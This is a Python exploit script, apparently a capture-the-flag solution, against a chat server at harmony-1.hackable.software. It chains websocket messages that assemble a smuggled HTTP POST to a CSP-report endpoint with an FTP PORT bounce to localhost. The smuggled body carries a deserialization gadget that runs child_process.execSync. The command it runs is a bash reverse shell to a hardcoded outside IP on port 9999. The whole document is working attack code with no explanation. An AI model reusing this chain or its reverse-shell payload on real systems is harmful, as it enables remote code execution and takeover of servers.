from websocket import create_connection
import json, random
from pwn import *
import time
import socks

context.log_level = 'debug'
# context.proxy = (socks.SOCKS5, '127.0.0.1', 7891)

HOST = "ws://harmony-1.hackable.software:3380/chat"

def init():
    global channel_id, channel_id2, host_ws, user_id

    host_ws = create_connection(HOST)

    host_ws.send('{"type":"register","displayName":"POST /csp-report?"}')
    res = json.loads(host_ws.recv())
    host_ws.recv()

    # print(res)
    user_id = res['uid']
    print('[*] user id: ' + user_id)

    host_ws.send('{"type":"new-channel","name":"' + str(random.randint(10000, 99999)) + '"}')
    res = json.loads(host_ws.recv())
    
    # print(res)
    channel_id = res['channels'][0]['chId']
    print('[*] channel id: ' + channel_id)

    payload = 'HTTP/1.1'
    host_ws.send('{"type":"message","chId":' + json.dumps(channel_id) + ',"msg":' + json.dumps(payload) + '}')

    host_ws.recv()
    # res = json.loads(ws.recv())
    # print(res)

    # 

def save_msg(name, message):
    global channel_id, host_ws

    ws = create_connection(HOST)

    ws.send('{"type":"register","displayName":' + json.dumps(name) + '}')
    res = json.loads(ws.recv())
    ws.recv()

    print(res)
    user_id = res['uid']
    # print('[*] user id: ' + user_id)

    # invite
    host_ws.send('{"type":"invite","chId":' + json.dumps(channel_id) + ',"uid":' + json.dumps(user_id) + '}')
    res = json.loads(host_ws.recv())
    # print(res)

    ws.send('{"type":"message","chId":' + json.dumps(channel_id) + ',"msg":' + json.dumps(message) + '}')

    res = json.loads(ws.recv())
    print(res)

    ws.close()


init()
save_msg('Content-Length', '362')
save_msg('Content-type', 'application/csp-report')
save_msg('Connection', 'close')
save_msg('ZZZ', '')
# save_msg('BBB', '')

save_msg('{"csp-report":{"blocked-uri"', """"1","document-uri":"y","effective-directive":"1","original-policy":"m","referrer":"e","status-code":"200","violated-directive":"er","source-file":{"toString":{"___js-to-json-class___":"Function","json":"console.log(process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/45.76.221.54/9999 0>&1'`)+[])"}}}}""")
save_msg('BBB', '')

host_ws.close()

# ftp stage

p = remote('harmony-1.hackable.software', 3321)
p.sendline('user ' + user_id)
p.sendline('pass')

time.sleep(3)

p.sendline('PORT 127,0,0,1,13,52')
p.sendline('retr ' + channel_id)

p.interactive()